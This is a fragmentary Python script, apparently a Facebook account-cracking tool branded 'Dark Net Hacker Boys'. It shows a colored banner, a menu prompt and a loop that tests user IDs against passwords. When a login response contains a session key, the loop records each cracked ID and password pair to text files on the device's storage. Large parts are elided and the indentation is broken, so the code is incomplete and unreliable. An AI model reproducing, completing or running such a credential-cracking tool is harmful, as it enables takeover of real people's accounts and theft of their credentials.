...
#os.system('xdg-open https://www.facebook.com/dark.net.hacker.boys1?mibextid=ZbWKwL')
...
\033[1;32m     \033[1;36mCREATED BY\33[0;m   :  \033[1;34mDARK\33[0;m\033[1;31mNET \033[1;30mHACKER BOYS\33[0;m
\033[1;32m     \033[1;33mAUTHOR       :  \033[1;36mASRAF MAHDI
\033[1;32m     \033[1;34mGITHUB       :  \033[1;33mD-N-H-BOYS1
\033[1;32m     \033[1;35mSTATUS       :  \033[1;32mFree
\033[1;32m     \033[1;31mVIRSION      :  \033[1;33m2.1
"""
def linex():
	print('\033[1;37m----------------------------------------------')
def clear():
...
def awmafghan():
		...
		#os.system('xdg-open https://m.facebook.com/groups/275913961539106/?ref=share&mibextid=NSMWBT')
		print('\033[1;33m------------------------------------------------')
		mthd = input(' CHOOSE: ')
		clear()
                                ...
                                if 'session_key' in q:
                                        ...
                                        try:
                                                ...
                                                if uid in okk:pass
                                                        ...
                                                        print('\r\r\033[1;32m [D-N-H-BOYS-OK] '+str(uid)+' | '+pas+'\033[1;90m')
                                                        open('/sdcard/D-N-H-BOYS-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [D-N-H-BOYS-OK] '+uid+' | '+pas+'\033[1;97m')
                                                open('/sdcard/D-N-H-BOYS-OK-OK.txt','a').write(uid+'|'+pas+'\n')
                                                oks.append(ids)
                                                break
                                else:
                                        continue
